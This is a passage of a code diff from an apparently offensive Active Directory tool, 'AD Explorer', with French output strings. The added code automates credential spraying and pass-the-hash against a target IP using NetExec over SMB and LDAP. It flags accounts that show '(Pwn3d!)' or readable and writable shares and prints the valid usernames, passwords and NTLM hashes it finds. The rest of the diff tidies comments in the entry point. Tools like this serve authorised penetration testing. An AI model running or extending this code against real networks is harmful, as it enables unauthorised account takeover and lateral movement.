+                elif ret_code == 0 and output and not any(err_msg in output.lower() for err_msg in ["logon failure", "authentication failed", "access denied"]):
+                    if nxc_protocol == "smb" and "READ" in output or "WRITE" in output:
+                         success_detail = f"Service: {service_name}, User: {user}, Pass: {password} (Accès confirmé)"
+                         print(f"    {AnsiColors.GREEN}[+] SUCCÈS (Accès confirmé): {success_detail}{AnsiColors.ENDC}")
+                         successful_logins.append(success_detail)
+
+            for ntlm_hash in set(hashes_to_test):
+                if not ntlm_hash: continue
+
+                print(f"  [>] Test: {user} / Hash: {ntlm_hash[:10]}... (domaine: {domain if domain else 'local'}) sur {service_name}")
+                cmd = [NXC_CMD, nxc_protocol, target_ip, "-u", user, "-H", ntlm_hash]
+                if domain:
+                    cmd.extend(["-d", domain])
+                if nxc_protocol == "ldap" and (636 in ports or 3269 in ports):
+                    cmd.append("--ssl")
+                if nxc_protocol == "smb": cmd.append("--shares")
+
+                output, ret_code = run_command(cmd, capture_output=True)
+
+                if output and "(Pwn3d!)" in output:
+                    success_detail = f"Service: {service_name}, User: {user}, Hash: {ntlm_hash}"
+                    print(f"    {AnsiColors.GREEN}[+] SUCCÈS (Pwn3d! avec Hash): {success_detail}{AnsiColors.ENDC}")
+                    successful_logins.append(success_detail)
+                elif ret_code == 0 and output and not any(err_msg in output.lower() for err_msg in ["logon failure", "authentication failed", "access denied"]):
+                    if nxc_protocol == "smb" and "READ" in output or "WRITE" in output:
+                         success_detail = f"Service: {service_name}, User: {user}, Hash: {ntlm_hash} (Accès confirmé)"
+                         print(f"    {AnsiColors.GREEN}[+] SUCCÈS (Accès confirmé avec Hash): {success_detail}{AnsiColors.ENDC}")
+                         successful_logins.append(success_detail)
+
+
+    if successful_logins:
+        print("\n--- [!] Identifiants valides trouvés ---")
+        for login in set(successful_logins):
+            print(f"  {AnsiColors.GREEN}{login}{AnsiColors.ENDC}")
+    else:
+        print("\n--- [-] Aucun identifiant valide trouvé lors des tests. ---")
+
+    logging.info(f"Tests d'identifiants terminés. Succès: {len(set(successful_logins))}")
 
 
 # --- Point d'entrée principal ---
@@ -1148,15 +1275,11 @@ Dépendances externes requises (doivent être dans le PATH):
 
     open_services_found = initial_scan(args.target_ip)
     
-    if not open_services_found and not any(port_info[0] for port_info in SERVICE_PORTS.values()): # Vérifie si aucun port n'a été trouvé
+    if not open_services_found and not any(port_info[0] for port_info in SERVICE_PORTS.values()):
         logging.warning(f"Aucun service pertinent détecté sur {args.target_ip}. L'outil interactif pourrait avoir des fonctionnalités limitées.")
-        # On pourrait choisir de quitter ici, ou de continuer pour permettre des actions manuelles
-        # print("[-] Aucun service pertinent détecté. L'outil va quand même démarrer en mode limité.")
-        # Pour l'instant, on continue pour permettre l'utilisation de 'set creds' etc.
 
-    # Créer la session prompt_toolkit ici
     session = PromptSession(history=FileHistory('.ad_explorer_target_history'), style=cli_style)
 
-    main_loop(args.target_ip, open_services_found, session) # Passer la session à main_loop
+    main_loop(args.target_ip, open_services_found, session)
 
     logging.info("AD Explorer terminé.") 
